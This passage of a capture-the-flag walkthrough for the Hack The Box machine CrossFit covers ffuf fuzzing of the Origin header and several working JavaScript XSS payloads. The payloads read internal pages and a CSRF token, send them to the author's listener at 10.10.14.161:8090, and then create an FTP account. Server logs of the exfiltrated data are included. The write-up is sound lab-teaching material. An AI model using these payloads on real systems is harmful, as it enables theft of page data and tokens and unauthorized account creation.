       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.208
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Origin: http://FUZZ.crossfit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 25
 :: Matcher          : Regexp: Allow-Origin
________________________________________________

ftp                     [Status: 200, Size: 10701, Words: 3427, Lines: 369]
[WARN] Caught keyboard interrupt (Ctrl-C)
</span></pre></table></code></div></div><p>With the information from these articles I was able to craft a set of parameters to fuzz the <code class="language-plaintext highlighter-rouge">Origin</code> header. In order to do this I needed to use the <code class="language-plaintext highlighter-rouge">-H</code> flag to include the custom header selection, as well as use the <code class="language-plaintext highlighter-rouge">-mr</code> flag to match using a custom regular expression.</p><blockquote><h3 id="match-on-regular-expression-">Match on Regular Expression <a id="match-on-regular-expression"></a></h3><p>In some cases, however, you may be fuzzing for more complex bugs and want to filter based on a <a href="https://en.wikipedia.org/wiki/Regular_expression">regular expression</a>. For example, if you’re filtering for a path traversal bug you may wish to pass a value of <code class="language-plaintext highlighter-rouge">-mr "root:"</code> to FFUF to only identify successful responses that indicate a successful retreival of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p></blockquote><p>I knew if the response from the server included the words “Allow-Origin” that it was a valid request using the specified <code class="language-plaintext highlighter-rouge">Origin</code> header. Using this information, I was able to find another virtual host: <code class="language-plaintext highlighter-rouge">ftp.crossfit.htb</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-ftb-apache.png" alt="" /></p><p>However, loading up this URL in my browser just led to another default Apache page. Next, I decided to see if I could use the same Cross Origin Request Forgery to get the headers of the internal page to see if there was a different view from the proper origin.</p><h3 id="cross-origin-request-forgery-with-javascript">Cross Origin Request Forgery with JavaScript</h3><p>TODO: add screenshot of sending request with this payload in Burp</p><p>Since the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag that triggered the cross-site scripting exploit was using JavaScript (<code class="language-plaintext highlighter-rouge">alert()</code>), I decided that was the best language to write a payload in to try to get the server to access the page I wanted for me. I did a bit of research and found an easy way to make HTTP requests using JavaScript.</p><ul><li><a href="https://stackoverflow.com/questions/247483/http-get-request-in-javascript">https://stackoverflow.com/questions/247483/http-get-request-in-javascript</a></ul><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1">//test.js</span>
<span class="c1">//testing access to ftp.crossfit.htb</span>
<span class="c1">//</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ftp.crossfit.htb/</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">request1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">test</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
<span class="kd">var</span> <span class="nx">response1</span> <span class="o">=</span> <span class="nx">request1</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>

<span class="c1">//send response1 to my waiting python http.server</span>
<span class="kd">var</span> <span class="nx">request2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://10.10.14.161:8090/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">response1</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">request2</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
</pre></table></code></div></div><p>I wrote a JavaScript payload to reach out to the <code class="language-plaintext highlighter-rouge">ftp.crossfit.htb</code> site then send the response back to my waiting Python HTTP server. I used this instead of netcat so the server would stay active and I wouldn’t have to restart it each time the server closed the connection.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ python3 -m http.server 8090                                      
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.10.10.208 - - [15/Jan/2021 18:21:03] "GET /test.js HTTP/1.1" 200 -
10.10.10.208 - - [15/Jan/2021 18:24:34] "GET /test.js HTTP/1.1" 200 -
10.10.10.208 - - [15/Jan/2021 18:28:05] "GET /test.js HTTP/1.1" 200 -
10.10.10.208 - - [15/Jan/2021 18:28:05] code 404, message File not found
10.10.10.208 - - [15/Jan/2021 18:28:05] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
</pre></table></code></div></div><p>It took me a few tries, but I was able to get the server to download my script and execute it. The final response I got contained the encoded HTML for a web page.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>    
  <span class="nt">&lt;title&gt;</span>FTP Hosting - Account Management<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>        
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>        
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-12 margin-tb"</span><span class="nt">&gt;</span>            
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pull-left"</span><span class="nt">&gt;</span>
                    
        <span class="nt">&lt;h2&gt;</span>FTP Hosting - Account Management<span class="nt">&lt;/h2&gt;</span>
                    
        <span class="nt">&lt;/div&gt;</span>
                
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pull-right"</span><span class="nt">&gt;</span>                
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-success"</span> <span class="na">href=</span><span class="s">"http://ftp.crossfit.htb/accounts/create"</span><span class="nt">&gt;</span> Create New Account<span class="nt">&lt;/a&gt;</span>            
        <span class="nt">&lt;/div&gt;</span>
                
      <span class="nt">&lt;/div&gt;</span>    
    <span class="nt">&lt;/div&gt;</span>
            
    <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"table table-bordered"</span><span class="nt">&gt;</span>        
      <span class="nt">&lt;tr&gt;</span>            
        <span class="nt">&lt;th&gt;</span>No<span class="nt">&lt;/th&gt;</span>            
        <span class="nt">&lt;th&gt;</span>Username<span class="nt">&lt;/th&gt;</span>            
        <span class="nt">&lt;th&gt;</span>Creation Date<span class="nt">&lt;/th&gt;</span>            
        <span class="nt">&lt;th</span> <span class="na">width=</span><span class="s">"280px"</span><span class="nt">&gt;</span>Action<span class="nt">&lt;/th&gt;</span>        
      <span class="nt">&lt;/tr&gt;</span>            
    <span class="nt">&lt;/table&gt;</span>
        
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>After decoding the response I had the webpage at <code class="language-plaintext highlighter-rouge">http://ftp.crossfit.htb</code> as viewed internally. I could tell right away that this was not the same default Apache server page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2.5-rescreate-response1.png" alt="" /></p><p>I saved the HTML code to a file and opened it in my browser. The page turned out to be an account management page for FTP. The “Create Account” button was a link to a site that sounded interesting: <code class="language-plaintext highlighter-rouge">http://ftp.crossfit.htb/accounts/create</code>. I modified my JavaScript payload to see what was at this page.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>10.10.10.208 - - [15/Jan/2021 18:41:59] "GET /test.js HTTP/1.1" 200 -
10.10.10.208 - - [15/Jan/2021 18:41:59] code 404, message File not found
10.10.10.208 - - [15/Jan/2021 18:41:59] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EAdd%20New%20Account%3C/h2%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts%22%3E%20Back%3C/a%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/div%3E%3Cform%20action=%22http://ftp.crossfit.htb/accounts%22%20method=%22POST%22%3E%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22GSlwHU3OU1s0lcF102Hku1jwvXeBtqGiAvKCjEGH%22%3E%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EUsername:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22text%22%20name=%22username%22%20class=%22form-control%22%20placeholder=%22Username%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22form-group%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3EPassword:%3C/strong%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22password%22%20name=%22pass%22%20class=%22form-control%22%20placeholder=%22Password%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-xs-12%20col-sm-12%20col-md-12%20text-center%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-primary%22%3ESubmit%3C/button%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%3C/form%3E%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
</pre></table></code></div></div><p>I got back a response with the encoded HTML code for the <code class="language-plaintext highlighter-rouge">/accounts/create</code> website.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>FTP Hosting - Account Management<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-12 margin-tb"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pull-left"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;h2&gt;</span>Add New Account<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pull-right"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span> <span class="na">href=</span><span class="s">"http://ftp.crossfit.htb/accounts"</span><span class="nt">&gt;</span> Back<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://ftp.crossfit.htb/accounts"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_token"</span> <span class="na">value=</span><span class="s">"GSlwHU3OU1s0lcF102Hku1jwvXeBtqGiAvKCjEGH"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;strong&gt;</span>Username:<span class="nt">&lt;/strong&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;strong&gt;</span>Password:<span class="nt">&lt;/strong&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"pass"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Password"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12 text-center"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2.5-recreate-adduser.png" alt="" /></p><p>With this page it looked as if I could create a new account. I would need to send a POST request to <code class="language-plaintext highlighter-rouge">http://ftp.crossfit.htb/accounts</code> with a username, password, and the value from the hidden field <code class="language-plaintext highlighter-rouge">_token</code>.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">//test2.js</span>
<span class="c1">//testing _token retrieval</span>
<span class="c1">//</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ftp.crossfit.htb/accounts/create</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">request1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">test</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
<span class="kd">var</span> <span class="nx">response1</span> <span class="o">=</span> <span class="nx">request1</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>

<span class="c1">//var request2 = new XMLHttpRequest();</span>
<span class="c1">//send response1 to my waiting python http.server </span>
<span class="c1">//request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);</span>
<span class="c1">//request2.send();</span>

<span class="c1">//var token = response1.getElementsByName('_token')[0].value;</span>
<span class="kd">var</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">response_text</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">response1</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">response_text</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">_token</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>

<span class="c1">//send _token value to my waiting python http.server </span>
<span class="kd">var</span> <span class="nx">request3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request3</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://10.10.14.161:8090/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">token</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">request3</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</pre></table></code></div></div><p>I modified my script to retrieve the hidden <code class="language-plaintext highlighter-rouge">_token</code> value. At first, I tried just reading the value of the <code class="language-plaintext highlighter-rouge">_token</code> element out of the response, but after some troubleshooting and more reading I found that the response text wasn’t being properly parsed.</p><ul><li><a href="https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html">https://www.w3docs.com/snippets/javascript/how-to-get-the-value-of-text-input-field-using-javascript.html</a><li><a href="https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser">https://o7planning.org/12337/parsing-xml-in-javascript-with-domparser</a></ul><p>Once I was able to correctly parse this from the output I was able to send my POST request to the server to create a new user. First though, I had the test script send just the token back to me so I could see that it worked.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>10.10.10.208 - - [15/Jan/2021 19:37:38] "GET /test2.js HTTP/1.1" 200 -
10.10.10.208 - - [15/Jan/2021 19:37:38] code 404, message File not found
10.10.10.208 - - [15/Jan/2021 19:37:38] "GET /ObNaK9gJvibNxvnGNi26mA1IdM5PfI6BVme775Nc HTTP/1.1" 404 -
</pre></table></code></div></div><p>I received the reply back, this time with only the hidden <code class="language-plaintext highlighter-rouge">_token</code> value.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="c1">//test3.js</span>
<span class="c1">//send user creation request to /accounts</span>
<span class="c1">//</span>
<span class="c1">//Get the response from /accounts/create with the _token</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ftp.crossfit.htb/accounts/create</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">request1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">test</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">request1</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
<span class="kd">var</span> <span class="nx">response1</span> <span class="o">=</span> <span class="nx">request1</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>

<span class="c1">//var token = response1.getElementsByName('_token')[0].value;</span>
<span class="kd">var</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">response_text</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">response1</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">response_text</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">_token</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>

<span class="c1">//send values of 'test' for username and password and append _token</span>
<span class="kd">var</span> <span class="nx">values</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">username=test&amp;pass=test&amp;_token=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">;</span>

<span class="c1">//send request to my waiting python http.server for troubleshooting</span>
<span class="kd">var</span> <span class="nx">request2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://10.10.14.161:8090/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">values</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">request2</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">request2</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">request2</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>

<span class="c1">//send _token, username, password  to /accounts </span>
<span class="kd">var</span> <span class="nx">request3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">values</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">username=test&amp;pass=test&amp;_token=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">;</span>
<span class="nx">request3</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://ftp.crossfit.htb/accounts</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nx">request3</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="c1">//the server needs to know what type of content it is receiving</span>
<span class="nx">request3</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">request3</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">values</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">response3</span> <span class="o">=</span> <span class="nx">request3</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>

<span class="c1">//send request to my waiting python http.server with reply from account creation</span>
<span class="kd">var</span> <span class="nx">request4</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">request4</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">http://10.10.14.161:8090/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">response3</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">request4</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</pre></table></code></div></div><p>Next, I modified my payload to actually create the new FTP user.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>10.10.10.208 - - [15/Jan/2021 21:51:58] "GET /test3.js HTTP/1.1" 200 -
10.10.10.208 - - [15/Jan/2021 21:51:58] code 501, message Unsupported method ('POST')
